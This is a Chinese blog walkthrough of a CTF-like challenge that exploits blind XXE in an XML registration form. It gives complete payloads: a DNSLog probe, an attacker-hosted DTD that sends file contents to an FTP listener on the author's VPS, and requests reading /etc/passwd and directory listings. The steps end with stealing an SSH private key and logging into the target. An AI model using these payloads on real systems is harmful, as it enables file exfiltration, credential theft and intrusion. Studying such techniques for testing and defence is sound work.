**目录**

[Blind XXE读取任意文件Getshell](#t0 "Blind XXE读取任意文件Getshell")

* * *

这是一道类似CTF的题目。话不多说

访问链接，如下。于是随便输入任意数字，点击Create Account

![](https://img-blog.csdnimg.cn/20200317225317877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

抓包重放，发现是XML提交的格式。于是乎想到了XXE漏洞

![](https://img-blog.csdnimg.cn/20200317225740993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

尝试读取文件，发现结果无变化。这就陷入了僵局。因为这里结果无变化有可能是目标网站不存在XXE漏洞，也有可能是目标网站存在XXE漏洞，但是不回显数据。

![](https://img-blog.csdnimg.cn/20200317225806657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

于是，我们先得判断其是否存在XXE漏洞。利用DNSLog方法，我们提交如下Payload，如果目标网站存在XXE漏洞的话，就会请求我们指定的地址，当然就会去解析该地址，我们的DNS平台上就会有相应的解析记录。最后重放发现，返回包提示内部错误，并且我们的DNS平台上收到了查询的数据，即可证明目标网站存在XXS漏洞。

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE root [      
<!ENTITY % remote SYSTEM "http://eja5f2.dnslog.cn">      
%remote;]>      
<root/>      
<reg><name>111</name><tel>222</tel><email>333</email></reg>
```


![](https://img-blog.csdnimg.cn/20200401224920616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200401224956178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

现在已经证明了该网站存在XXS漏洞，但是由于无回显，所以我们只能利用Blind XXE方法。

### Blind XXE读取任意文件Getshell

首先，在我们的VPS上建立一个xml.dtd文件，内容如下。然后建立起一个HTTP服务，访问路径为：http://vps的IP/xml.dtd

```
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'ftp://vps的地址:2121/%file;'>">      
%all;
```


![](https://img-blog.csdnimg.cn/20200317230039539.png)

然后在我们的VPS上运行另外一个脚本，监听2121端口的流量

![](https://img-blog.csdnimg.cn/2020031723014763.png)

最后，我们提交的Post数据如下。重放

![](https://img-blog.csdnimg.cn/20200317230339468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，我们2121监听的端口收到了目标主机发送过来的 /etc/passwd 文件了。

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE ANY [      
<!ENTITY % file SYSTEM "file:///etc/passwd">      
<!ENTITY % dtd SYSTEM "http://VPS的IP/xml.dtd">      
%dtd;      
%send;      
]>      
<reg><name>11</name><tel>22</tel><email>33</email></reg>
```


![](https://img-blog.csdnimg.cn/20200317230418155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们修改POST提交数据，可以对目标主机实现任意目录浏览和任意文件读取。如下，是读取目标主机 /etc/ 目录

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE ANY [      
<!ENTITY % file SYSTEM "file:///etc/">      
<!ENTITY % dtd SYSTEM "http://VPS的IP/xml.dtd">      
%dtd;      
%send;      
]>      
<reg><name>11</name><tel>22</tel><email>33</email></reg>
```


![](https://img-blog.csdnimg.cn/2020031723070718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200317230606153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

能列目录和读取任意文件后，我们就可以去查找目标主机的敏感文件了。最终，我们在目标主机的 /home/用户名/ 目录下找到了私钥文件

![](https://img-blog.csdnimg.cn/20200317231251440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

读取id\_rsa私钥文件。

![](https://img-blog.csdnimg.cn/202003172314179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里需要注意的是如何将读取到的私钥格式化，因为读取的数据很杂乱。我们最终可以读取 xxe-ftp.log 文件内容，然后过滤出私钥的数据。

![](https://img-blog.csdnimg.cn/20200317234117714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后成功连上目标主机

![](https://img-blog.csdnimg.cn/20200317231511768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**注：**

这里通过监听2121端口的流量读取的数据，是从 RETR 开始后面的这些

![](https://img-blog.csdnimg.cn/20200317232106163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200317232146294.png)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

 相关文章：[记一次利用BLIND OOB XXE漏洞获取文件系统访问权限的测试](https://www.freebuf.com/vuls/167087.html "记一次利用BLIND OOB XXE漏洞获取文件系统访问权限的测试")